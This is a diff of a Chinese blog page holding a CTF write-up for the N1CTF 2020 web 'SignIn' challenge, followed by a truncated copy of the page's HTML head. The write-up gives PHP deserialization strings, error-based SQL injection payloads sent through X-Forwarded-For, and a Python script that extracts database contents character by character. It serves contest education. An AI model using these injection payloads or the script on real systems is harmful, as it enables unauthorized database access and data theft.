@@ -1,1 +1,584 @@
-<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png"><link rel="icon" type="image/png" href="/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。"><meta name="author" content="slug01sh"><meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF"><title>2020年10月N1CTF部分web题解 - 积淀｜小杰的个人博客</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"slug01sh.github.io",root:"/",version:"1.8.7",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},copy_btn:!0,image_zoom:{enable:!0},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!0,baidu:null,google:"G-WTRCMZDFLE",gtag:"G-WTRCMZDFLE",tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.1.1"></head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>积淀｜小杰的个人博客</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item"><a class="nav-link" href="/ctf/"><i class="iconfont icon-user-fill"></i> CTF</a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类</a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档</a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner" id="banner" parallax="true" style="background:url(https://rmt.dogedoge.com/fetch/fluid/storage/bg/dojm2h.png?w=1920&q=100&fmt=webp) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="2020年10月N1CTF部分web题解"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-10-17 09:13" pubdate>2020年10月17日 上午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 1k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 15 分钟</span></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">2020年10月N1CTF部分web题解</h1><div class="markdown-body"><p>题解地址：<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p><hr><a id="more"></a><h1 id="Web-SignIn（SQL盲注-报错注入-布尔注入）"><a href="#Web-SignIn（SQL盲注-报错注入-布尔注入）" class="headerlink" title="Web-SignIn（SQL盲注+报错注入+布尔注入）"></a>Web-SignIn（SQL盲注+报错注入+布尔注入）</h1><p>思路历程大致是这样的，比赛后没环境（</p><ul><li>理解反序列化执行流程。</li><li>反序列化执行 toString 函数。（绕过 wakeup，利用 destuct 的 echo 函数）<ul><li>安装 php5.5</li><li>本地绕过</li><li>云端绕过（没有回显）</li></ul></li><li>利用 stristr 函数调用 toString 函数。<ul><li>时间盲注（时间函数被 WAF 了）</li><li>SQL注入之基于运行错误的Boolean注入<ul><li>语法错误和正常执行 noip</li><li>特殊错误 welcome（含数据库名或后面的函数报错）<ul><li>‘+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+’</li><li>‘+(select _(1))+’<br>MySQL</li><li>exp(~(select * from (select n1ctf_websign())a))</li></ul></li></ul></li></ul></li><li>构造 XFF 进行 SQL 注入。</li><li>编写 exp 进行报错<br>payload：’+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+’<br>利用 and 的特性进行判断。</li><li>最后从 n1key 中读出 flag。<ul><li>注意字段为 key 时需要使用别名。（与MySQL字段冲突）</li></ul></li></ul><p>反序列化：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png" srcset="/img/loading.gif"></p><p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png" srcset="/img/loading.gif"></p><p>用到的SQL语句:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># 查询数据库名字<br># <span class="hljs-keyword">database</span>()<br><br># 查询数据库信息<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># 查询文件读取权限<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># 查询当前用户<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># 查询数据库版本<br># version()<br><br># 查询表名的长度<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># 查询表名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># 判断字段名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br># 查询 ip 表。（边插入边查询，需要使用别名）<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 不使用字段名度值<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># 判断是否有数据<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># 查询文件<br># <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>爆破使用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # 返回字符列表</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取判读 True 和 False 的依据</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># 执行成功返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 用于测试函数是否正常执行（使用 while 不方便）</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># 不同的字典</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find 用于存储已找到的字符</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 使用 ascii 作用判断依据更好。</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># 使用 ascii 码进行判断（更优）</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># 使用 char 进行字符判断。</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>你真的了解 IP 吗，PHP 如何严格获取真实用户 IP？：<a target="_blank" rel="noopener" href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li><li>Bugku INSERT INTO注入(时间盲注）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li></ol><hr><p>后面的题目以后有时间补补（占坑</p></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/CTF/">CTF</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/ctf/">ctf</a></div></div><p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext"><article class="post-prev col-6"><a href="/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">2020年10月ByteCTF部分web题解</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"><span class="hidden-mobile">2020年10月西湖论剑CTF部分web题解</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></footer><script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script defer>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-WTRCMZDFLE","auto"),ga("send","pageview")</script><script async src="https://www.google-analytics.com/analytics.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script><script defer>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-WTRCMZDFLE")</script><script src="/js/boot.js"></script></body></html>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。">
+  <meta name="author" content="slug01sh">
+  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF">
+  <title>2020年10月N1CTF部分web题解 - 积淀｜小杰的个人博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"slug01sh.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-WTRCMZDFLE","gtag":"G-WTRCMZDFLE","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>积淀｜小杰的个人博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/ctf/">
+                <i class="iconfont icon-user-fill"></i>
+                CTF
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://rmt.dogedoge.com/fetch/fluid/storage/bg/dojm2h.png?w=1920&q=100&fmt=webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2020年10月N1CTF部分web题解">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-17 09:13" pubdate>
